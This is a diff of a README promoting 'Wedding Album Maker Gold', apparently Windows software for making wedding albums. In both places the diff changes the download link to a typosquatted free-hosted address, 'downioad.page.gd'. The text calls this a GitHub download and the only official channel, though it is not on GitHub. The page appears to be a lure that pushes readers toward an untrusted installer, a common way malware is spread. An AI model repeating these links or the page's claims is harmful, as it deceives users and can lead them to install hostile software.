@@ -2,7 +2,7 @@
 
 Wedding Album Maker Gold is the premier desktop application for crafting stunning wedding albums in 2026. Designed specifically for Windows 10 and 11, it provides a comprehensive set of tools to transform your wedding photos into professional-quality albums effortlessly. Whether you're a professional photographer or a DIY enthusiast, this software offers everything you need to preserve your memories beautifully.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,7 +64,7 @@ We offer online documentation, video tutorials, and email support for users enco
 
 To get started with Wedding Album Maker Gold 2026 Ultimate Suite, download the installer from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Note: This is the only official download channel. Please ensure you download from this link for the most secure and up-to-date version.*
 
